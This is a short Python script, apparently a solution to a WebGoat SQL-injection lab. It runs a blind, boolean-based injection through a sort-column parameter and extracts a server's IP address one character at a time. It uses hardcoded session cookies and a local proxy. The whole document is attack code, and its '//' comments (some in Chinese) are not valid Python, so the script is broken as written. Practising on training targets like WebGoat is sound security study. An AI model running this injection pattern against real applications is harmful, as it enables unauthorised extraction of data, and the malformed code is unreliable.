import requests
from string import digits
chars = digits+"."
headers = {//头部
'X-Requested-With': 'XMLHttpRequest'
}
cookies = {//cookie
'JSESSIONID': 'HrLE9ubl3zmQWuQ_dQHYn4sqEZH7GdJPUmnprBNp',
'JSESSIONID.75fbd09e': '7mc1x9iei6ji4xo2a3u4kbz1'
}
i = 0
result = ""//结果
proxy={"http": "http://127.0.0.1:8080"}
while True:
    i+=1
    temp = result
    for char in chars:
        vul_url ="http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,{0},1)='{1}'%20from%20servers%20where%20hostname='webgoat-prd')%20then%20hostname%20else%20mac%20end".format(i, char)
        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)
        if 'webgoat-acc' in resp.json()[0]['hostname']:
            result += char
            print(result)
    if temp == result:
        break